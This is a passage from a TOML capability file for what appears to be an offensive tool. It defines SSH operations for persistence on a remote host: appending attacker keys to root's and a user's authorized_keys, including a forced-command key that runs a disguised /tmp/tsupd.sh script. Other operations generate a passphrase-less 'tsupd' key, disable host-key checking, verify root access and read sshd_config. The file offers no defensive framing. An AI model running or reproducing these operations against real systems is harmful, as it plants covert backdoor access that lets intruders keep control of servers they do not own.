output = 'lines'
network = true
[[capability.provider]]
binary = 'ssh'
[[capability.provider.operation]]
name = 'Key Auth Verify'
args = ['-i', '{key}', '-o', 'BatchMode=yes', '-o', 'StrictHostKeyChecking=no', '{username}@{rhost}', 'id']
output = 'lines'
network = true
[[capability.provider]]
binary = 'ssh'
[[capability.provider.operation]]
name = 'Root Key Plant'
args = ['-o', 'StrictHostKeyChecking=no', 'root@{rhost}', 'mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys']
output = 'lines'
network = true
[[capability.provider]]
binary = 'ssh'
[[capability.provider.operation]]
name = 'Root Auth Verify'
args = ['-i', '{key}', '-o', 'BatchMode=yes', '-o', 'StrictHostKeyChecking=no', 'root@{rhost}', 'whoami']
output = 'lines'
network = true
[[capability.provider]]
binary = 'ssh-keygen'
[[capability.provider.operation]]
name = 'Dedicated Key Generate'
args = ['-t', 'ed25519', '-f', '/tmp/tsupd_key', '-N', '""', '-C', 'tsupd']
output = 'lines'
network = false
[[capability.provider]]
binary = 'ssh'
[[capability.provider.operation]]
name = 'Authorized Keys Readback'
args = ['-o', 'StrictHostKeyChecking=no', '{username}@{rhost}', 'cat ~/.ssh/authorized_keys']
output = 'lines'
network = true
[[capability.provider]]
binary = 'ssh-keyscan'
[[capability.provider.operation]]
name = 'Host Key Pin'
args = ['{rhost}']
output = 'lines'
network = true
[[capability.provider]]
binary = 'grep'
[[capability.provider.operation]]
name = 'Permit Root Check'
args = ['-i', 'permitrootlogin', '/etc/ssh/sshd_config']
output = 'lines'
network = false
[[capability.provider]]
binary = 'ssh'
[[capability.provider.operation]]
name = 'Restricted Key Plant'
args = ['-o', 'StrictHostKeyChecking=no', '{username}@{rhost}', 'echo "command=\"/tmp/tsupd.sh\" ' , '$(cat {key})" >> ~/.ssh/authorized_keys']
output = 'lines'
network = true
[[capability.provider]]
binary = 'ssh-keygen'
[[capability.provider.operation]]
name = 'Key Fingerprint Verify'
args = ['-l', '-f', '{key}']
